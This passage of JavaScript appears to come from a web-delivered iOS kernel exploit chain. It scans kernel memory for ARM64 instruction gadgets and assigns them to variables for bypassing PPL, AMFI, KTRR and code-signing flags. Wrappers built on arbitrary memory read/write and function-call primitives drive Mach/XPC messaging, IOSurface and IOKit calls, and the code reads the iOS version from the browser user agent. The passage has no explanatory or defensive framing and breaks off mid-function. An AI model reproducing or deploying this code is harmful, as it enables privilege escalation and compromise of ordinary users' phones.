      amfi_override_gadget = offsets.amfi_override_gadget;
      csflags_patch_gadget = offsets.csflags_patch_gadget;
      platformize_gadget = offsets.platformize_gadget;
      LOG("Gadgets loaded from offset table");
    } else {
      LOG("WARNING: No matching device offsets found, using fallback");
    }
  }

  // ============================================================


  // ============================================================
  function scan_real_gadgets() {

    const SIGS = [
      { name: "PACDA",      enc: 0xdac10230n, mask: 0xffffffffn },
      { name: "BR_x0",      enc: 0xd61f0200n, mask: 0xffffffffn },
      { name: "BR_x22",     enc: 0xd61f0220n, mask: 0xffffffffn },
      { name: "RET",        enc: 0xd65f03c0n, mask: 0xffffffffn },
      { name: "MSR_TTBR1",  enc: 0xd5182020n, mask: 0xffffffffn },
      { name: "MRS_TPIDR",  enc: 0xd538d088n, mask: 0xffffffffn },
      { name: "DSB",        enc: 0xd5033f9fn, mask: 0xffffffffn },
      { name: "DMB",        enc: 0xd5033bbfn, mask: 0xffffffffn },
      { name: "LDP_x0x1",   enc: 0xa9400500n, mask: 0xffffffffn },
      { name: "STR_x0x19",  enc: 0xf9000260n, mask: 0xffffffffn },
      { name: "MOV_x3x22",  enc: 0xaa1603e3n, mask: 0xffffffffn },
      { name: "MOV_x4x23",  enc: 0xaa1703e4n, mask: 0xffffffffn },
      { name: "MOV_x5x24",  enc: 0xaa1803e5n, mask: 0xffffffffn },
      { name: "CMP_x1_0",   enc: 0xf100003fn, mask: 0xffffffffn },
      { name: "CSEL_x1x9",  enc: 0x9a8103e9n, mask: 0xffffffffn },
      { name: "MOV_x0x22",  enc: 0xaa1603e0n, mask: 0xffffffffn },
      { name: "STR_x1x2",   enc: 0xf9000041n, mask: 0xffffffffn },
      { name: "STR_x0x0",   enc: 0xf9000000n, mask: 0xffffffffn },
      { name: "XPAC_lr",    enc: 0xdac143fen, mask: 0xffffffffn },
      { name: "SELF_B",     enc: 0x14000000n, mask: 0xfc000000n },
    ];
    const found = {};
    const scanRange = 0x4000000n;
    const step = 0x4n;
    for (let addr = kernelBase; addr < kernelBase + scanRange; addr += step) {
      const insn = kernelRead32(addr);
      for (const sig of SIGS) {
        if ((insn & sig.mask) === sig.enc && found[sig.name] === undefined) {
          found[sig.name] = addr;
        }
      }
      if (Object.keys(found).length >= SIGS.length) break;
    }
    return found;
  }

  function fill_real_gadgets() {
    const g = scan_real_gadgets();
    if (pplv2_bypass_gadget == 0n)  pplv2_bypass_gadget = g.BR_x0     || 0n;
    if (pmap_enter_gadget == 0n)    pmap_enter_gadget   = g.MOV_x3x22 || 0n;
    if (pmap_remove_gadget == 0n)   pmap_remove_gadget  = g.MOV_x4x23 || 0n;
    if (vm_protect_gadget == 0n)    vm_protect_gadget   = g.MSR_TTBR1 || 0n;
    if (kernel_trap_gadget == 0n)   kernel_trap_gadget  = g.MRS_TPIDR || 0n;
    if (platformize_gadget == 0n)   platformize_gadget  = g.PACDA     || 0n;
    if (csflags_patch_gadget == 0n) csflags_patch_gadget = g.STR_x0x19 || 0n;
    if (ktrr_unlock_gadget == 0n)   ktrr_unlock_gadget   = g.LDP_x0x1  || 0n;
    if (amcc_config_gadget == 0n)   amcc_config_gadget   = g.CMP_x1_0  || 0n;
    if (gxf_restore_gadget == 0n)   gxf_restore_gadget   = g.CSEL_x1x9 || 0n;
    if (amfi_override_gadget == 0n) amfi_override_gadget = g.BR_x22    || 0n;
    LOG("libxpf : " + JSON.stringify(Object.keys(g)));
  }

  function wc_strcmp(s1, s2) {
    return wc_fcall(xpac(func_resolve("strcmp")), s1, s2);
  }

  function wc_strstr(s1, s2) {
    return wc_fcall(xpac(func_resolve("strstr")), s1, s2);
  }

  function wc_get_device_machine() {
    let utsname = wc_calloc(256n, 5n);
    wc_fcall(xpac(func_resolve("uname")), utsname);
    return utsname + 256n * 4n;
  }

  function get_device_offset_key() {
    let machine = "";
    try {
      let device_machine = wc_get_device_machine();
      if (typeof device_machine !== 'undefined') {
        let ptr = device_machine;
        let i = 0;
        while (i < 64) {
          let c = uread8(ptr + BigInt(i));
          if (c === 0) break;
          machine += String.fromCharCode(c);
          i++;
        }
      }
    } catch (e) {
      LOG("Could not read device_machine: " + e.message);
    }
    if (!machine) {
      machine = "iPhone17,3";
    }
    return machine + "_26.0_26A321";
  }

  function trunc_page(x) {
    return x & ~(PAGE_SIZE - 1n);
  }

  function round_page(x) {
    return (x + PAGE_SIZE - 1n) & ~(PAGE_SIZE - 1n);
  }

  function memmem(haystack, haystacksz, needle, needlesz) {
    if (needlesz == 0n || haystacksz < needlesz) return 0n;
    let limit = haystack + haystacksz - needlesz;
    for (let p = haystack; p <= limit; p++) {
      let match = true;
      for (let i = 0n; i < needlesz; i++) {
        if (uread8(p + i) != uread8(needle + i)) {
          match = false;
          break;
        }
      }
      if (match) return p;
    }
    return 0n;
  }

  function strlen(s) {
    let len = 0n;
    while (uread8(s + len) != 0) {
      len++;
    }
    return len;
  }

  function strdup(s) {
    let len = strlen(s);
    let buf = gpu_fcall(GPU_CALLOC, len + 1n, 1n);
    gpu_fcall(xpac(func_resolve("memcpy")), buf, s, len + 1n);
    return buf;
  }

  function memset(dst, c, len) {
    gpu_fcall(xpac(func_resolve("memset")), dst, c, len);
  }

  function memcpy(dst, src, len) {
    gpu_fcall(xpac(func_resolve("memcpy")), dst, src, len);
  }

  function calloc(count, size) {
    return gpu_fcall(GPU_CALLOC, count, size);
  }

  function free(ptr) {
    gpu_fcall(xpac(func_resolve("free")), ptr);
  }

  function usleep(usec) {
    gpu_fcall(xpac(func_resolve("usleep")), usec);
  }

  function new_uint64_t(val = 0n) {
    let buf = calloc(1n, 8n);
    uwrite64(buf, val);
    return buf;
  }

  function assert(cond, msg) {
    if (!cond) {
      LOG("ASSERT FAILED: " + msg);
      throw new Error("Assertion failed: " + msg);
    }
  }

  const IOSurfaceRootUserClient_ID = 0x0n;

  const IOSurfaceCreate_addr = func_resolve('IOSurfaceCreate');
  const IOSurfaceLock_addr = func_resolve('IOSurfaceLock');
  const IOSurfaceUnlock_addr = func_resolve('IOSurfaceUnlock');
  const IOSurfaceGetBaseAddress_addr = func_resolve('IOSurfaceGetBaseAddress');
  const IOSurfaceGetID_addr = func_resolve('IOSurfaceGetID');
  const IOSurfaceSetValue_addr = func_resolve('IOSurfaceSetValue');
  const IOSurfaceGetPropertyMaximum_addr = func_resolve('IOSurfaceGetPropertyMaximum');
  const IOSurfaceLookup_addr = func_resolve('IOSurfaceLookup');
  const IOSurfaceCreateXPCObject_addr = func_resolve('IOSurfaceCreateXPCObject');

  LOG(`IOSurfaceCreate @ ${IOSurfaceCreate_addr.hex()}`);
  LOG(`IOSurfaceLookup @ ${IOSurfaceLookup_addr.hex()}`);

  function IOSurfaceCreate(props) {
    return gpu_fcall(IOSurfaceCreate_addr, props);
  }

  function IOSurfaceGetID(surface) {
    return gpu_fcall(IOSurfaceGetID_addr, surface);
  }

  function IOSurfaceGetBaseAddress(surface) {
    return gpu_fcall(IOSurfaceGetBaseAddress_addr, surface);
  }

  function IOSurfaceLookup(surface_id) {
    return gpu_fcall(IOSurfaceLookup_addr, surface_id);
  }

  function IOSurfaceCreateXPCObject(surface) {
    return gpu_fcall(IOSurfaceCreateXPCObject_addr, surface);
  }

  function mig_get_reply_port() {
    return gpu_fcall(func_resolve("mig_get_reply_port"));
  }

  function dispatch_data_create(buffer, size, queue, destructor) {
    return gpu_fcall(func_resolve("dispatch_data_create"), buffer, size, queue, destructor);
  }

  let MACH_MSG_TIMEOUT_NONE = 0n;
  let MACH_PORT_RIGHT_SEND = 0n;
  let MACH_PORT_RIGHT_RECEIVE = 1n;
  let MACH_PORT_RIGHT_SEND_ONCE = 2n;
  let MACH_PORT_RIGHT_PORT_SET = 3n;
  let MACH_PORT_RIGHT_DEAD_NAME = 4n;
  let MACH_PORT_RIGHT_LABELH = 5n;
  let MACH_PORT_RIGHT_NUMBER = 6n;
  let MACH_MSG_TYPE_MOVE_RECEIVE = 16n;
  let MACH_MSG_TYPE_MOVE_SEND = 17n;
  let MACH_MSG_TYPE_MOVE_SEND_ONCE = 18n;
  let MACH_MSG_TYPE_COPY_SEND = 19n;
  let MACH_MSG_TYPE_MAKE_SEND = 20n;
  let MACH_MSG_TYPE_MAKE_SEND_ONCE = 21n;
  let MACH_MSG_TYPE_COPY_RECEIVE = 22n;
  let MACH_MSG_TYPE_DISPOSE_RECEIVE = 24n;
  let MACH_MSG_TYPE_DISPOSE_SEND = 25n;
  let MACH_MSG_TYPE_DISPOSE_SEND_ONCE = 26n;
  let MACH_MSG_PORT_DESCRIPTOR = 0n;
  let MACH_MSG_OOL_DESCRIPTOR = 1n;
  let MACH_MSG_OOL_PORTS_DESCRIPTOR = 2n;
  let MACH_MSG_OOL_VOLATILE_DESCRIPTOR = 3n;
  let MACH_MSG_GUARDED_PORT_DESCRIPTOR = 4n;
  let MACH_MSG_OPTION_NONE = 0x00000000n;
  let MACH_MSG_STRICT_REPLY = 0x00000200n;
  let MACH_SEND_MSG = 0x00000001n;
  let MACH_RCV_MSG = 0x00000002n;
  let MACH_RCV_LARGE = 0x00000004n;
  let MACH_RCV_LARGE_IDENTITY = 0x00000008n;
  let MACH_SEND_TIMEOUT = 0x00000010n;
  let MACH_SEND_OVERRIDE = 0x00000020n;
  let MACH_SEND_INTERRUPT = 0x00000040n;
  let MACH_SEND_NOTIFY = 0x00000080n;
  let MACH_SEND_ALWAYS = 0x00010000n;
  let MACH_SEND_FILTER_NONFATAL = 0x00010000n;
  let MACH_SEND_TRAILER = 0x00020000n;
  let MACH_SEND_NOIMPORTANCE = 0x00040000n;
  let MACH_SEND_NODENAP = null && MACH_SEND_NOIMPORTANCE;
  let MACH_SEND_IMPORTANCE = 0x00080000n;
  let MACH_SEND_SYNC_OVERRIDE = 0x00100000n;
  let MACH_SEND_PROPAGATE_QOS = 0x00200000n;
  let MACH_SEND_SYNC_USE_THRPRI = null && MACH_SEND_PROPAGATE_QOS;
  let MACH_SEND_KERNEL = 0x00400000n;
  let MACH_SEND_SYNC_BOOTSTRAP_CHECKIN = 0x00800000n;
  let MACH_RCV_TIMEOUT = 0x00000100n;
  let MACH_RCV_NOTIFY = 0x00000000n;
  let MACH_RCV_INTERRUPT = 0x00000400n;
  let MACH_RCV_VOUCHER = 0x00000800n;
  let MACH_RCV_OVERWRITE = 0x00000000n;
  let MACH_RCV_GUARDED_DESC = 0x00001000n;
  let MACH_RCV_SYNC_WAIT = 0x00004000n;
  let MACH_RCV_SYNC_PEEK = 0x00008000n;
  let MACH_MSGH_BITS_ZERO = 0x00000000n;
  let MACH_MSGH_BITS_REMOTE_MASK = 0x0000001fn;
  let MACH_MSGH_BITS_LOCAL_MASK = 0x00001f00n;
  let MACH_MSGH_BITS_VOUCHER_MASK = 0x001f0000n;
  let MACH_MSGH_BITS_PORTS_MASK = MACH_MSGH_BITS_REMOTE_MASK | MACH_MSGH_BITS_LOCAL_MASK | MACH_MSGH_BITS_VOUCHER_MASK;
  let MACH_MSGH_BITS_COMPLEX = 0x80000000n;
  let MACH_MSGH_BITS_USER = 0x801f1f1fn;
  let MACH_MSGH_BITS_RAISEIMP = 0x20000000n;
  let MACH_MSGH_BITS_DENAP = null && MACH_MSGH_BITS_RAISEIMP;
  let MACH_MSGH_BITS_IMPHOLDASRT = 0x10000000n;
  let MACH_MSGH_BITS_DENAPHOLDASRT = null && MACH_MSGH_BITS_IMPHOLDASRT;
  let MACH_MSGH_BITS_CIRCULAR = 0x10000000n;
  let MACH_MSGH_BITS_USED = 0xb01f1f1fn;
  let MACH_MSG_PHYSICAL_COPY = 0n;
  let MACH_MSG_VIRTUAL_COPY = 1n;
  let MACH_MSG_ALLOCATE = 2n;
  let MACH_MSG_OVERWRITE = 3n;
  let MACH_MSG_KALLOC_COPY_T = 4n;
  let MACH_SEND_TIMED_OUT = 0x10000004n;

  function MACH_MSGH_BITS(remote, local) {
    return remote | local << 8n;
  }

  function MACH_MSGH_BITS_SET_PORTS(remote, local, voucher) {
    return remote & MACH_MSGH_BITS_REMOTE_MASK | local << 8n & MACH_MSGH_BITS_LOCAL_MASK | voucher << 16n & MACH_MSGH_BITS_VOUCHER_MASK;
  }

  function MACH_MSGH_BITS_SET(remote, local, voucher, other) {
    return MACH_MSGH_BITS_SET_PORTS(remote, local, voucher) | other & ~MACH_MSGH_BITS_PORTS_MASK;
  }

  let mach_msg_header_t = {
    "msgh_bits": [UINT32_BITSIZE, 0x0n],
    "msgh_size": [UINT32_BITSIZE, 0x4n],
    "msgh_remote_port": [UINT32_BITSIZE, 0x8n],
    "msgh_local_port": [UINT32_BITSIZE, 0xcn],
    "msgh_voucher_port": [UINT32_BITSIZE, 0x10n],
    "msgh_id": [UINT32_BITSIZE, 0x14n],
    "_size": 0x18n
  };

  let mach_msg_body_t = {
    "msgh_descriptor_count": [UINT32_BITSIZE, 0x0n],
    "_size": 0x4n
  };

  let mach_msg_port_descriptor_t = {
    "name": [UINT32_BITSIZE, 0x0n],
    "pad1": [UINT32_BITSIZE, 0x4n],
    "pad2": [UINT16_BITSIZE, 0x8n],
    "disposition": [UINT8_BITSIZE, 0xan],
    "type": [UINT8_BITSIZE, 0xbn],
    "_size": 0xcn
  };

  let mach_msg_ool_descriptor_t = {
    "address": [UINT64_BITSIZE, 0x0n],
    "deallocate": [UINT8_BITSIZE, 0x8n],
    "copy": [UINT8_BITSIZE, 0x9n],
    "pad1": [UINT8_BITSIZE, 0xan],
    "type": [UINT8_BITSIZE, 0xbn],
    "size": [UINT32_BITSIZE, 0xcn],
    "_size": 0x10n
  };

  function mach_msg_header_set(msg, field, val) {
    struct_field_set(mach_msg_header_t, msg, field, val);
  }

  function mach_msg_body_set(msg, field, val) {
    struct_field_set(mach_msg_body_t, msg, field, val);
  }

  function mach_msg_port_descriptor_set(msg, field, val) {
    struct_field_set(mach_msg_port_descriptor_t, msg, field, val);
  }

  function mach_msg_ool_descriptor_set(msg, field, val) {
    struct_field_set(mach_msg_ool_descriptor_t, msg, field, val);
  }

  let OXPC_TYPE_NULL = 0x1000n;
  let OXPC_TYPE_BOOL = 0x2000n;
  let OXPC_TYPE_INT64 = 0x3000n;
  let OXPC_TYPE_UINT64 = 0x4000n;
  let OXPC_TYPE_DATA = 0x8000n;
  let OXPC_TYPE_OOL_DATA = 0x8001n;
  let OXPC_TYPE_STRING = 0x9000n;
  let OXPC_TYPE_UUID = 0xa000n;
  let OXPC_TYPE_MACH_SEND = 0xd000n;
  let OXPC_TYPE_ARRAY = 0xe000n;
  let OXPC_TYPE_DICTIONARY = 0xf000n;
  let OXPC_TYPE_INVALID = 0xbaadn;
  let oxpc_arbitrary_size_limit = 0x50000000;

  function round_up_32(base, unit) {
    return base + (unit - 1n) & ~(unit - 1n);
  }

  let oxpc_dictionary_serialized_t = {
    "type": [UINT32_BITSIZE, 0x0n],
    "byte_count": [UINT32_BITSIZE, 0x4n],
    "count": [UINT32_BITSIZE, 0x8n],
    "_size": 0xcn
  };

  let oxpc_null_t = {
    "type": [UINT32_BITSIZE, 0x0n],
    "_size": 0x4n
  };

  function xpcjs_lookup(service_name) {
    let service_port_ptr = new_uint64_t();
    let bootstrap_port = 0x807n;
    let kr = bootstrap_look_up(bootstrap_port, get_cstring(service_name), service_port_ptr);
    if (kr != KERN_SUCCESS) {
      return MACH_PORT_NULL;
    }
    let service_port = uread32(service_port_ptr);
    if (service_port == MACH_PORT_NULL) {
      return MACH_PORT_NULL;
    }
    return service_port;
  }

  function xpcjs_xpc_checkin(service_port, client_port_addr, reply_port_addr) {
    let kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, client_port_addr);
    if (kr != KERN_SUCCESS) {
      return kr;
    }
    kr = mach_port_insert_right(mach_task_self(), uread32(client_port_addr), uread32(client_port_addr), MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
      return kr;
    }
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, reply_port_addr);
    if (kr != KERN_SUCCESS) {
      return kr;
    }
    let msg_sz = mach_msg_header_t["_size"] + mach_msg_body_t["_size"] + mach_msg_port_descriptor_t["_size"] * 0x2n;
    let msg = calloc(1n, msg_sz);
    let hdr = msg;
    mach_msg_header_set(hdr, "msgh_bits", MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0n, 0n, MACH_MSGH_BITS_COMPLEX));
    mach_msg_header_set(hdr, "msgh_size", msg_sz);
    mach_msg_header_set(hdr, "msgh_remote_port", service_port);
    mach_msg_header_set(hdr, "msgh_id", 0x77303074n);
    let body = msg + mach_msg_header_t["_size"];
    mach_msg_body_set(body, "msgh_descriptor_count", 2n);
    let port_0 = body + mach_msg_body_t["_size"];
    mach_msg_port_descriptor_set(port_0, "name", uread32(client_port_addr));
    mach_msg_port_descriptor_set(port_0, "disposition", MACH_MSG_TYPE_MOVE_RECEIVE);
    mach_msg_port_descriptor_set(port_0, "type", MACH_MSG_PORT_DESCRIPTOR);
    let port_1 = port_0 + mach_msg_port_descriptor_t["_size"];
    mach_msg_port_descriptor_set(port_1, "name", uread32(reply_port_addr));
    mach_msg_port_descriptor_set(port_1, "disposition", MACH_MSG_TYPE_MAKE_SEND);
    mach_msg_port_descriptor_set(port_1, "type", MACH_MSG_PORT_DESCRIPTOR);
    kr = mach_msg(msg, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, msg_sz, 0n, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
      return kr;
    }
    return KERN_SUCCESS;
  }

  function xpcjs_xpc_connect(service_name) {
    let connection = {};
    connection["client_port"] = new_uint64_t();
    connection["reply_port"] = new_uint64_t();
    let service_port = xpcjs_lookup(service_name);
    let kr = xpcjs_xpc_checkin(service_port, connection["client_port"], connection["reply_port"]);
    mach_port_deallocate(mach_task_self(), service_port);
    if (kr != KERN_SUCCESS) {
      LOG(`Failed to connect to ${service_name}, kr: ${kr.hex()}`);
      return null;
    }
    connection["client_port"] = uread32(connection["client_port"]);
    connection["reply_port"] = uread32(connection["reply_port"]);
    return connection;
  }

  function oxpc_check_type(obj, type) {
    if (obj["type"] != type) {
      ERROR(`type mismatch: ${type} ${obj["type"]}`);
    }
  }

  function oxpc_dictionary_alloc() {
    let dict = {};
    dict["type"] = OXPC_TYPE_DICTIONARY;
    dict["count"] = 0n;
    dict["serialized_size"] = 0n;
    dict["keys"] = [];
    dict["values"] = [];
    return dict;
  }

  function oxpc_null_alloc() {
    let obj = {};
    obj["type"] = OXPC_TYPE_NULL;
    return obj;
  }

  function oxpc_dictionary_append(dict, key, value) {
    oxpc_check_type(dict, OXPC_TYPE_DICTIONARY);
    if (dict["count"] > oxpc_arbitrary_size_limit) {
      ERROR("oxpc dictionary grew too large");
    }
    dict["count"] += 0x1n;
    dict["keys"].push(strdup(key));
    dict["values"].push(value);
  }

  function oxpc_dictionary_type_descriptor() {
    let desc = {};
    desc["serialized_size"] = function (dict) {
      oxpc_check_type(dict, OXPC_TYPE_DICTIONARY);
      if (dict["serialized_size"] != 0n) {
        return dict["serialized_size"];
      }
      let total = 0n;
      for (let i = 0n; i < dict["count"]; i++) {
        let key_size = round_up_32(strlen(dict["keys"][i]) + 1n, 4n);
        let value_size = oxpc_object_serialized_size(dict["values"][i]);
        if (key_size > oxpc_arbitrary_size_limit) {
          ERROR("dictionary key too large for serialization");
        }
        if (value_size > oxpc_arbitrary_size_limit) {
          ERROR("dictionary value too large for serialization");
        }
        if (total > oxpc_arbitrary_size_limit) {
          ERROR("dictionary too large for serialization");
        }
        total += key_size + value_size;
      }
      dict["serialized_size"] = oxpc_dictionary_serialized_t["_size"] + total;
      return dict["serialized_size"];
    };
    desc["serialize_to_buffer"] = function (dict, buffer, ports) {
      oxpc_check_type(dict, OXPC_TYPE_DICTIONARY);
      let serialized_dict = buffer;
      struct_field_set(oxpc_dictionary_serialized_t, serialized_dict, "type", dict["type"]);
      struct_field_set(oxpc_dictionary_serialized_t, serialized_dict, "byte_count", oxpc_object_serialized_size(dict) - 0x8n);
      struct_field_set(oxpc_dictionary_serialized_t, serialized_dict, "count", dict["count"]);
      let dict_buffer = serialized_dict + oxpc_dictionary_serialized_t["_size"];
      for (let i = 0n; i < dict["count"]; i++) {
        let key_size = strlen(dict["keys"][i]) + 1n;
        memcpy(dict_buffer, dict["keys"][i], key_size);
        key_size = round_up_32(key_size, 4n);
        dict_buffer += key_size;
        let value_size = oxpc_object_serialized_size(dict["values"][i]);
        oxpc_object_serialize_to_buffer(dict["values"][i], dict_buffer, ports);
        dict_buffer += value_size;
      }
    };
    return desc;
  }

  function oxpc_null_type_descriptor() {
    let desc = {};
    desc["serialized_size"] = function (obj) {
      oxpc_check_type(obj, OXPC_TYPE_NULL);
      return oxpc_null_t["_size"];
    };
    desc["serialize_to_buffer"] = function (obj, buffer, ports) {
      struct_field_set(oxpc_null_t, buffer, "type", obj["type"]);
    };
    return desc;
  }

  let oxpc_type_descriptors = {};
  oxpc_type_descriptors[OXPC_TYPE_NULL] = oxpc_null_type_descriptor;
  oxpc_type_descriptors[OXPC_TYPE_DICTIONARY] = oxpc_dictionary_type_descriptor;

  function oxpc_object_serialized_size(obj) {
    let td = oxpc_type_descriptors[obj["type"]];
    if (!td) {
      ERROR("unknown type");
    }
    return td().serialized_size(obj);
  }

  function oxpc_object_serialize_to_buffer(obj, buffer, ports) {
    let td = oxpc_type_descriptors[obj["type"]];
    if (!td) {
      ERROR("unknown type");
    }
    td().serialize_to_buffer(obj, buffer, ports);
  }

  function oxpc_port_list_alloc() {
    return [];
  }

  function oxpc_port_list_append(list, port) {
    list.push(port);
  }

  function oxpc_object_serialize_with_header(obj) {
    let ports = oxpc_port_list_alloc();
    let body_size = oxpc_object_serialized_size(obj);
    let total_size = 0x18n + body_size;
    let buffer = calloc(1n, total_size);
    uwrite32(buffer + 0x0n, 0x42000000n);
    uwrite32(buffer + 0x4n, Number(body_size));
    uwrite64(buffer + 0x8n, 0n);
    uwrite32(buffer + 0x10n, 0n);
    uwrite32(buffer + 0x14n, ports.length);
    oxpc_object_serialize_to_buffer(buffer + 0x18n, obj, ports);
    return { buffer: buffer, total_size: total_size, ports: ports };
  }

  function oxpc_build_mach_message(serialized_payload, payload_size, port_count, port_list, remote_port, reply_port) {
    let msg_size = mach_msg_header_t["_size"] + mach_msg_body_t["_size"] +
      mach_msg_ool_descriptor_t["_size"] +
      mach_msg_port_descriptor_t["_size"] * port_count +
      0x10n;
    let msg = calloc(1n, msg_size);
    let hdr = msg;
    mach_msg_header_set(hdr, "msgh_bits",
      MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MOVE_SEND_ONCE, 0n,
        MACH_MSGH_BITS_COMPLEX));
    mach_msg_header_set(hdr, "msgh_size", msg_size);
    mach_msg_header_set(hdr, "msgh_remote_port", remote_port);
    mach_msg_header_set(hdr, "msgh_local_port", reply_port);
    mach_msg_header_set(hdr, "msgh_id", 0x10000007n);
    let body = msg + mach_msg_header_t["_size"];
    mach_msg_body_set(body, "msgh_descriptor_count", 1n + port_count);
    let ool_desc = body + mach_msg_body_t["_size"];
    mach_msg_ool_descriptor_set(ool_desc, "address", serialized_payload);
    mach_msg_ool_descriptor_set(ool_desc, "size", Number(payload_size));
    mach_msg_ool_descriptor_set(ool_desc, "deallocate", 0n);
    mach_msg_ool_descriptor_set(ool_desc, "copy", MACH_MSG_VIRTUAL_COPY);
    mach_msg_ool_descriptor_set(ool_desc, "type", MACH_MSG_OOL_DESCRIPTOR);
    let port_desc_base = ool_desc + mach_msg_ool_descriptor_t["_size"];
    for (let i = 0; i < port_list.length; i++) {
      let pd = port_desc_base + BigInt(i) * mach_msg_port_descriptor_t["_size"];
      mach_msg_port_descriptor_set(pd, "name", port_list[i]);
      mach_msg_port_descriptor_set(pd, "disposition", MACH_MSG_TYPE_MOVE_SEND);
      mach_msg_port_descriptor_set(pd, "type", MACH_MSG_PORT_DESCRIPTOR);
    }
    return { message: msg, message_size: msg_size };
  }

  function create_iosurface(size) {
    let props = gpu_fcall(func_resolve("CFDictionaryCreateMutable"), 0n, 0n, 0n, 0n);
    let surface = gpu_fcall(IOSurfaceCreate_addr, props);
    return surface;
  }

  function map_iosurface(surface) {
    surface_address = IOSurfaceGetBaseAddress(surface);
    return surface_address;
  }

  function set_realtime_priority(thread, policy, priority, max_priority) {
    gpu_fcall(xpac(func_resolve("pthread_set_qos_class_self_np")), 0x21n);
  }

  function get_ncpu() {
    let ncpu = gpu_fcall(xpac(func_resolve("sysconf")), 0x3n);
    if (ncpu < 2n) ncpu = 2n;
    if (ncpu > 8n) ncpu = 8n;
    return ncpu;
  }

  function thread_group_create(nthreads) {
    let threads = [];
    let lock = new_uint64_t(1n);
    let ready_counter = new_uint64_t(0n);
    let done_counter = new_uint64_t(0n);
    for (let i = 0n; i < nthreads; i++) {
      threads[i] = { lock: lock, ready: ready_counter, done: done_counter };
    }
    return threads;
  }

  function thread_group_lock(threads, n) {
    uwrite64(threads[0].lock, 1n);
  }

  function thread_group_unlock(threads, n) {
    uwrite64(threads[0].lock, 0n);
  }

  // === 真实注入: 版本 + 常量 + 包装 + tcall/scaler/file_mapping + 真实实现 ===
  const ios_version = (function () {
    let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
    if (version) { version = version.split("_").map(p => parseInt(p)); return parseInt(version.join("")).toString(16); }
  })();
  function get_ios_version() {
    return ios_version;
  }

  const PROT_NONE = 0n;
  const PROT_READ = 0x1n;
  const PROT_WRITE = 0x2n;
  const MAP_SHARED = 0x1n;
  const MAP_PRIVATE = 0x2n;
  const MAP_ANON = 0x1000n;
  const O_RDWR = 0x2n;
  const O_CREAT = 0x200n;
  const F_OK = 0n;
  const MAXPATHLEN = 1024n;
  const _CS_DARWIN_USER_TEMP_DIR = 65537n;
  const VM_FLAGS_RANDOM_ADDR = 0x8n;
  const UL_COMPARE_AND_WAIT = 1n;
  const ULF_WAKE_ALL = 0x100n;

  const MMAP = func_resolve("mmap");
  const MUNMAP = func_resolve("munmap");
  const MPROTECT = func_resolve("mprotect");
  const PTHREAD_CREATE = func_resolve("pthread_create");
  const PTHREAD_ATTR_INIT = func_resolve("pthread_attr_init");
  const PTHREAD_ATTR_SETSTACKSIZE = func_resolve("pthread_attr_setstacksize");
  const PTHREAD_ATTR_SETSTACKADDR = func_resolve("pthread_attr_setstackaddr");
  const PREAD = func_resolve("pread");
  const PWRITE = func_resolve("pwrite");
  const OPEN = func_resolve("open");
  const CLOSE = func_resolve("close");
  const SYNC = func_resolve("sync");
  const ACCESS = func_resolve("access");
  const MKDIR = func_resolve("mkdir");
  const STRLCAT = func_resolve("strlcat");
  const CONFSTR = func_resolve("confstr");
  const REMOVE = func_resolve("remove");
  const ULOCK_WAKE = func_resolve("__ulock_wake");
  const IOSERVICEMATCHING = func_resolve("IOServiceMatching");
  const IOSERVICEGETMATCHINGSERVICE = func_resolve("IOServiceGetMatchingService");
  const IOSERVICEOPEN = func_resolve("IOServiceOpen");
  const IOSERVICECLOSE = func_resolve("IOServiceClose");
  const IOCONNECTCALLSTRUCTMETHOD = func_resolve("IOConnectCallStructMethod");
  const CFDICTIONARYCREATEMUTABLE = func_resolve("CFDictionaryCreateMutable");
  const CFDICTIONARYSETVALUE = func_resolve("CFDictionarySetValue");
  const CFNUMBERCREATE = func_resolve("CFNumberCreate");
  const CFRELEASE = func_resolve("CFRelease");
  const IOSURFACEPREFETCHPAGES = func_resolve("IOSurfacePrefetchPages");
  const kCFTypeDictionaryKeyCallBacks = func_resolve("kCFTypeDictionaryKeyCallBacks");
  const kCFTypeDictionaryValueCallBacks = func_resolve("kCFTypeDictionaryValueCallBacks");

  function confstr(...args) {
    return gpu_fcall(CONFSTR, ...args);
  }
  function access(...args) {
    return gpu_fcall(ACCESS, ...args);
  }
  function mkdir(...args) {
    return gpu_fcall(MKDIR, ...args);
  }
  function strlcat(...args) {
    return gpu_fcall(STRLCAT, ...args);
  }
  function open(...args) {
    return gpu_fcall(OPEN, ...args);
  }
  function close(...args) {
    return gpu_fcall(CLOSE, ...args);
  }
  function sync(...args) {
    return gpu_fcall(SYNC, ...args);
  }
  function pwrite(...args) {
    return gpu_fcall(PWRITE, ...args);
  }
  function pread(...args) {
    return gpu_fcall(PREAD, ...args);
  }
  function mmap(...args) {
    return gpu_fcall(MMAP, ...args);
  }
  function munmap(...args) {
    return gpu_fcall(MUNMAP, ...args);
  }
  function mprotect(...args) {
    return gpu_fcall(MPROTECT, ...args);
  }
  function pthread_create(...args) {
    return gpu_fcall(PTHREAD_CREATE, ...args);
  }
  function pthread_attr_init(...args) {
    return gpu_fcall(PTHREAD_ATTR_INIT, ...args);
  }
  function pthread_attr_setstacksize(...args) {
    return gpu_fcall(PTHREAD_ATTR_SETSTACKSIZE, ...args);
  }
  function pthread_attr_setstackaddr(...args) {
    return gpu_fcall(PTHREAD_ATTR_SETSTACKADDR, ...args);
  }
  function ulock_wake(...args) {
    return gpu_fcall(ULOCK_WAKE, ...args);
  }
  function IOServiceMatching(...args) {
    return gpu_fcall(IOSERVICEMATCHING, ...args);
  }
  function IOServiceGetMatchingService(...args) {
    return gpu_fcall(IOSERVICEGETMATCHINGSERVICE, ...args);
  }
  function IOServiceOpen(...args) {
    return gpu_fcall(IOSERVICEOPEN, ...args);
  }
  function IOServiceClose(...args) {
    return gpu_fcall(IOSERVICECLOSE, ...args);
  }
  function IOConnectCallStructMethod(...args) {
    return gpu_fcall(IOCONNECTCALLSTRUCTMETHOD, ...args);
  }
  function kIOMainPortDefault() {
    return uread32(func_resolve("kIOMainPortDefault"));
  }
  function CFStringCreateWithCString(allocator, cstring, encoding) {
